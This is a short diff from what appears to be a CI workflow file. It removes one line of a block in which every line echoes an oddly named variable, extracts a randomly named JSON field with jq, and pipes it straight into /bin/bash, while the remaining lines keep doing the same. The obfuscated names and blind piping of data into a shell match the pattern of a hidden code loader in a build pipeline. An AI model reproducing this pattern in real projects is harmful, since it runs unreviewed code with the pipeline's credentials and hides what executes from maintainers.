@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$vv66" | jq -r .iasil18652 | /bin/bash
           echo $xofq2 | jq -r .te86130 | /bin/bash
           echo $ccn53138 | jq -r .nkc5 | /bin/bash
-          echo $r6148 | jq -r .bmvl61618 | /bin/bash
           echo $wdha69 | jq -r .odidn445 | /bin/bash
           echo $kaxxn09 | jq -r .b27231 | /bin/bash
           echo $cpr2002 | jq -r .vzquo02957 | /bin/bash
